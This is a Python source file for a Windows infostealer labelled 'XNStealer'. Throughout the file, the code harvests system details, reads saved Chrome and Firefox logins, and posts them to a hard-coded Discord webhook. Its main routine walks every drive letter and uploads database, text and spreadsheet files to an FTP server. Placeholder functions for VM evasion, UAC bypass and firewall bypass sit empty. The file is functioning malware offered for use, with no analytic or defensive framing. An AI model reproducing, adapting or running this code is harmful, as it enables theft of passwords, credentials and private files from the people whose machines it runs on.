import wmi
import requests
import win32api
import win32crypt
import os
import sys
import json
import re
import sqlite3
import platform
import ftplib
import psutil
import uuid
import socket
from base64 import b64decode

class Crypt:
    def decrypt_chrome_pass(data):
        return win32crypt.CryptUnprotectData(
            data,None,None,None,0
        )[1]

    def decrypt_firefox_userandpass(data):
        decode = b64decode(data)

class Stealer:
    def __init__(self):
        self.antivm = False
        self.bypassuac = False
        self.bypassfw = False
        self.stealfiles = (".sql",".db",".txt",".xls",".xlsx")


        self.webhook = "https://discord.com/api/webhooks/1085505767462944798/_Zl2-mDs0m3uh_LnENZitlbMaSmr0gTw4ABb0Z3j32CfKM3CejHiSMLneXt7hDkyhQio"
        self.ftpserv = "192.168.1.19"
        self.ftpuser = "ftpserv"
        self.ftppass = "1234"

    def steal_info(self):
        info = {
            "username":"XNStealer",
            "content":"Stealing data from victims",
            "embeds":[{
                "title":"Victim Informations",
                "description":f"""System Information

Hostname     : {socket.gethostname()}
Architecture : {platform.architecture()}
OS           : {platform.platform()}
Version      : {platform.version()}
Processor    : {platform.processor()}
GPU          : {wmi.WMI().Win32_VideoController()[0].name}
RAM          : {str(round(psutil.virtual_memory().total / (1024.0 ** 3)))} GB
Storage      : {psutil.disk_usage("C:").total / (1024 ** 3):.2f} GB

Internet

IP-Address   : {""}
Latitude     : {""}
Longitude    : {""}
Mac-address  : {":".join(re.findall('..',"%012x"%uuid.getnode()))}
                """
            }],
        }

        print(requests.post(self.webhook,json=info))

    def steal_chrome_cred(self):
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Login Data")

        if (not(os.path.exists(db_path))):
            send_error = {
                "username":"XNStealer",
                "content":"victim is not using Chrome",
                "embeds":[{
                    "title":"Failed to stealing the credentials",
                    "description":"i'm failed to steal the victim Chrome credential, sorry..."
                }]
            }
            senderr = requests.post(self.webhook,json=send_error)
            print(senderr)
        else:
            conn = sqlite3.connect(db_path)
            comm = conn.cursor()
            comm.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins "
            "order by date_last_used")

            for (info) in comm.fetchall():
                url = info[0]
                url_login = info[1]
                user_name = info[2]
                password = info[3]
            
                if (user_name or password):
                    extract = f"""main url  : {url}
login url : {url_login}
username  : {user_name}
password  : {password}
                    """

                    sendtowebhook = {
                        "username":"XNStealer",
                        "content":"Stealing credential from Chrome browser",
                        "embeds":[{
                            "title":"Chrome Credential from victim "+socket.gethostname(),
                            "description":extract
                        }]
                    }

                    send_cred = requests.post(self.webhook,json=sendtowebhook)
                    print(send_cred)
                
                else:
                    continue

    def steal_firefox_cred(self):
        firefox_path = os.path.join(os.environ["USERPROFILE"],"AppData","Roaming","Mozilla","FireFox","Profiles")
        for folder in os.listdir(firefox_path):
            login_path = os.path.join(os.environ["USERPROFILE"],"AppData","Roaming","Mozilla","FireFox","Profiles",folder,"logins.json")

            if (not(os.path.exists(firefox_path))):
                send_error = {
                    "username":"XNStealer",
                    "content":"victim is not using firefox",
                    "embeds":[{
                        "title":"Failed to stealing the credentials",
                        "description":"sorry, but i'm failed to steal the victim credentials from FireFox"
                    }]
                }
                print(requests.post(self.webhook,json=send_error))

            elif (not(os.path.exists(login_path))):
                continue

            else:
                with open(login_path,"r") as list_cred:
                    load_data = json.loads(list_cred.readline())
                    get_data = load_data["logins"]

                    for (listall) in get_data:
                        extract_data = f"""url      : {listall['hostname']}
username : {listall['encryptedUsername']}
password : {listall['encryptedPassword']}
                        """
                        send_cred = {
                            "username":"XNStealer",
                            "content":"stealing credential from FireFox browser",
                            "embeds":[{
                                "title":"FireFox credential from victim "+socket.gethostname(),
                                "description":extract_data
                            }]
                        }

                        print(requests.post(self.webhook,json=send_cred))


    def steal_file(self,path):
        serv = ftplib.FTP(self.ftpserv)
        serv.login(self.ftpuser,self.ftppass)

        for (dir,_,file) in os.walk(path):
            for target in file:
                if (target.endswith(self.stealfiles)):
                    with open(os.path.join(dir,target),"rb") as send_file:
                        serv.storbinary("STOR "+target,send_file)
                        send_file.close()
                else:
                    continue
        
        serv.quit()

class Tools:
    def AntiVM():
        pass
    def bypassUAC():
        pass
    def bypassFireWall():
        pass

def main():
    s = Stealer()
    if (s.antivm):
        pass
    if (s.bypassfw):
        pass
    if (s.bypassuac):
        pass

    s.steal_info()
    s.steal_chrome_cred()
    s.steal_firefox_cred()
    for logicaldrives in ["A:\\","B:\\","C:\\Users","E:\\","F:\\","G:\\","H:\\","I:\\","J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\","S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]:
        s.steal_file(logicaldrives)

if __name__ == "__main__":
    main()